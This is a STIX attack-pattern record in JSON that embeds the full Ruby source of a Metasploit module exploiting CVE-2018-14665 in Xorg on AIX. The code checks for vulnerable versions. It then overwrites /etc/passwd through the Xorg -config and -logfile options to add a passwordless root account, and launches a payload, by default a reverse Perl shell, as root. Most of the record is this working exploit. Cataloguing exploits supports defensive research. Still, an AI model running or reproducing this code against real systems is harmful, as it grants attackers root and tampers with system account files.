{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5f6e5360-54e6-456c-80ba-7932ad38dbae",
    "created": "2024-08-14T16:56:48.278747Z",
    "modified": "2024-08-14T16:56:48.278751Z",
    "name": "Xorg X11 Server Local Privilege Escalation",
    "description": "( WARNING: Successful execution of this module results in /etc/passwd being overwritten.  This module is a port of the OpenBSD X11 Xorg exploit to run on AIX.  A permission check flaw exists for -modulepath and -logfile options when starting Xorg.  This allows unprivileged users that can start the server the ability to elevate privileges and run arbitrary code under root privileges.  This module has been tested with AIX 7.1 and 7.2, and should also work with 6.1. Due to permission restrictions of the crontab in AIX, this module does not use cron and instead overwrites /etc/passwd in order to create a new user with root privileges. All currently logged in users need to be included when /etc/passwd is overwritten else AIX will throw 'Cannot get \"LOGNAME\" variable' when attempting to change user. The Xorg '-fp' parameter used in the OpenBSD exploit does not work on AIX and is replaced by '-config', in conjuction with ANSI-C quotes to inject newlines when overwriting /etc/passwd. )",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/aix/local/xorg_x11_server.rb",
            "external_id": "xorg_x11_server.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-14665"
        },
        {
            "source_name": "reference",
            "url": "https://www.securepatterns.com/2018/10/cve-2018-14665-xorg-x-server.html"
        },
        {
            "source_name": "reference",
            "url": "https://aix.software.ibm.com/aix/efixes/security/xorg_advisory3.asc"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/dzflack/exploits/blob/master/aix/aixxorg.pl"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GreatRanking\n\n  include Msf::Post::File\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Xorg X11 Server Local Privilege Escalation',\n      'Description'    => %q(\n        WARNING: Successful execution of this module results in /etc/passwd being overwritten.\n\n        This module is a port of the OpenBSD X11 Xorg exploit to run on AIX.\n\n        A permission check flaw exists for -modulepath and -logfile options when\n        starting Xorg.  This allows unprivileged users that can start the server\n        the ability to elevate privileges and run arbitrary code under root\n        privileges.\n\n        This module has been tested with AIX 7.1 and 7.2, and should also work with 6.1.\n        Due to permission restrictions of the crontab in AIX, this module does not use cron,\n        and instead overwrites /etc/passwd in order to create a new user with root privileges.\n        All currently logged in users need to be included when /etc/passwd is overwritten,\n        else AIX will throw 'Cannot get \"LOGNAME\" variable' when attempting to change user.\n        The Xorg '-fp' parameter used in the OpenBSD exploit does not work on AIX,\n        and is replaced by '-config', in conjuction with ANSI-C quotes to inject newlines when\n        overwriting /etc/passwd.\n      ),\n      'Author'         =>\n        [\n          'Narendra Shinde', # Discovery and original FreeBSD exploit\n          'Zack Flack <dzflack[at]gmail.com>' # Metasploit module and original AIX exploit\n        ],\n      'License'        => MSF_LICENSE,\n      'DisclosureDate' => '2018-10-25',\n      'Notes'         =>\n        {\n          'SideEffects' => [ CONFIG_CHANGES ]\n        },\n      'References'     =>\n        [\n          ['CVE', '2018-14665'],\n          ['URL', 'https://www.securepatterns.com/2018/10/cve-2018-14665-xorg-x-server.html'],\n          ['URL', 'https://aix.software.ibm.com/aix/efixes/security/xorg_advisory3.asc'],\n          ['URL', 'https://github.com/dzflack/exploits/blob/master/aix/aixxorg.pl'],\n          ['EDB', '45938']\n        ],\n      'Platform'       => ['unix'],\n      'Arch'           => [ARCH_CMD],\n      'SessionTypes'   => ['shell'],\n      'Payload'        => {\n        'Compat' => {\n          'PayloadType'  => 'cmd',\n          'RequiredCmd'  => 'perl'\n        }\n      },\n      'DefaultOptions' => {\n        'Payload' => 'cmd/unix/reverse_perl'\n      },\n      'Targets'        =>\n        [\n          ['IBM AIX Version 6.1', {}],\n          ['IBM AIX Version 7.1', {}],\n          ['IBM AIX Version 7.2', {}]\n        ],\n      'DefaultTarget'  => 1))\n\n    register_options(\n      [\n        OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])\n      ]\n    )\n  end\n\n  def check\n    xorg_path = cmd_exec('command -v Xorg')\n    if !xorg_path.include?('Xorg')\n      print_error('Could not find Xorg executable')\n      return Exploit::CheckCode::Safe\n    end\n\n    ksh93_path = cmd_exec('command -v ksh93')\n    if !ksh93_path.include?('ksh')\n      print_error('Could not find Ksh93 executable')\n      return Exploit::CheckCode::Safe\n    end\n\n    if !xorg_vulnerable?\n      print_error('Xorg version is not vulnerable')\n      return Exploit::CheckCode::Safe\n    end\n\n    return Exploit::CheckCode::Appears\n  end\n\n  def exploit\n    status = check\n\n    if status == Exploit::CheckCode::Safe\n      fail_with(Failure::NotVulnerable, '')\n    end\n\n    if !writable?(datastore['WritableDir'])\n      fail_with(Failure::BadConfig, \"#{datastore['WritableDir']} is not writable\")\n    end\n\n    xorg_path = cmd_exec('command -v Xorg')\n    ksh93_path = cmd_exec('command -v ksh93')\n\n    xorg_payload = generate_xorg_payload(xorg_path, ksh93_path, datastore['WritableDir'])\n    xorg_script_path = \"#{datastore['WritableDir']}/wow.ksh\"\n    upload_and_chmodx(xorg_script_path, xorg_payload)\n\n    passwd_backup = \"#{datastore['WritableDir']}/passwd.backup\"\n    print_status(\"Backing up /etc/passwd to #{passwd_backup}\")\n    cmd_exec(\"cp /etc/passwd #{passwd_backup}\")\n    register_file_for_cleanup(passwd_backup)\n\n    print_status(\"Executing #{xorg_script_path}\")\n    cmd_exec(xorg_script_path)\n    print_status('Checking if we are root')\n\n    if root?\n      shell_payload = %(#!#{ksh93_path}\n#{payload.encoded}\n)\n      shell_script_path = \"#{datastore['WritableDir']}/wowee.ksh\"\n      upload_and_chmodx(shell_script_path, shell_payload)\n\n      print_status('Executing shell payload')\n      cmd_exec(\"#{ksh93_path} -c \\\"echo #{shell_script_path} | su - wow &\\\"\")\n\n      print_status('Restoring original /etc/passwd')\n      cmd_exec(\"su - wow -c \\\"cp #{passwd_backup} /etc/passwd\\\"\")\n    else\n      fail_with(Failure::PayloadFailed, '')\n    end\n  end\n\n  def generate_xorg_payload(xorg_path, ksh93_path, writabledir)\n    passwd_file = read_file('/etc/passwd')\n    passwd_array = passwd_file.split(\"\\n\")\n\n    print_status('Retrieving currently logged in users')\n    users = cmd_exec('who | cut -d\\' \\' -f1 | sort | uniq')\n    users << \"\\n\"\n    users_array = users.split(\"\\n\")\n\n    logged_in_users = ''\n    if !users_array.empty?\n      users_array.each do |user|\n        user << ':'\n        passwd_array.each do |line|\n          if line.index(user) == 0\n            logged_in_users << '\\n'\n            logged_in_users << line\n          end\n        end\n      end\n    end\n\n    passwd_data = \"$'#{logged_in_users}\\\\nwow::0:0::/:/usr/bin/ksh\\\\n#'\"\n\n    subdir_count = writabledir.count('/')\n    relative_passwd = '../' * subdir_count + '../../etc/passwd'\n\n    return %(#!#{ksh93_path}\n    #{xorg_path} -config #{passwd_data} -logfile #{relative_passwd} :1 > /dev/null 2>&1\n)\n  end\n\n  def xorg_vulnerable?\n    version = cmd_exec('lslpp -L | grep -i X11.base.rte | awk \\'{ print $2 }\\'')\n    print_status(\"Xorg version is #{version}\")\n    semantic_version = Rex::Version.new(version)\n\n    vulnerable_versions = [\n      ['6.1.9.0', '6.1.9.100'],\n      ['7.1.4.0', '7.1.4.30'],\n      ['7.1.5.0', '7.1.5.31'],\n      ['7.2.0.0', '7.2.0.1'],\n      ['7.2.1.0', '7.2.1.0'],\n      ['7.2.2.0', '7.2.2.0'],\n      ['7.2.3.0', '7.2.3.15']\n    ]\n\n    vulnerable_versions.each do |version_pair|\n      if semantic_version >= Rex::Version.new(version_pair[0]) &&\n         semantic_version <= Rex::Version.new(version_pair[1])\n        return true\n      end\n    end\n\n    return false\n  end\n\n  def root?\n    id_output = cmd_exec('su - wow -c \"id\"')\n\n    if id_output.include?('euid=0') || id_output.include?('uid=0')\n      print_good('Got root!')\n      return true\n    end\n\n    print_error('Not root')\n    false\n  end\n\n  def upload_and_chmodx(path, data)\n    print_status(\"Writing to #{path}\")\n    rm_f(path)\n    write_file(path, data)\n    cmd_exec(\"chmod 0555 '#{path}'\")\n\n    register_file_for_cleanup(path)\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-10-25",
    "x_mitre_platforms": [
        "['unix']"
    ]
}